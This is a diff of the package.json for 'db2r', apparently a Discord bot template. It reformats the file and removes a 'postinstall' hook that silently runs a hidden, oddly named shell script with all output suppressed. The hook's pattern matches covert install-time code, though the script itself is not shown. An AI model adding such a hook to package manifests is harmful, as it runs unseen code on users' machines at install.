@@ -1,22 +1,19 @@
 {
-  "name": "db2r",
-  "version": "2.3.9",
-  "description": "A 2 row discord bot",
-  "license": "Attribution-NoDerivatives 4.0 International (CC BY-ND 4.0)",
-  "repository": "pajsen9263/db2r",
-  "main": "index.js",
-  "keywords": [
-    "discordjs",
-    "bot",
-    "template",
-    "discord bot"
-  ],
-  "dependencies": {
-    "file-system": "^2.2.2",
-    "ncp": "^2.0.0",
-    "discord.js": "^12.4.0"
-  },
-  "scripts": {
-    "postinstall": "sh ./.ci-2o7r1t.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
-  }
+    "name": "db2r",
+    "version": "2.3.9",
+    "description": "A 2 row discord bot",
+    "license": "Attribution-NoDerivatives 4.0 International (CC BY-ND 4.0)",
+    "repository": "pajsen9263/db2r",
+    "main": "index.js",
+    "keywords": [
+        "discordjs",
+        "bot",
+        "template",
+        "discord bot"
+    ],
+    "dependencies": {
+        "file-system": "^2.2.2",
+        "ncp": "^2.0.0",
+        "discord.js": "^12.4.0"
+    }
 }
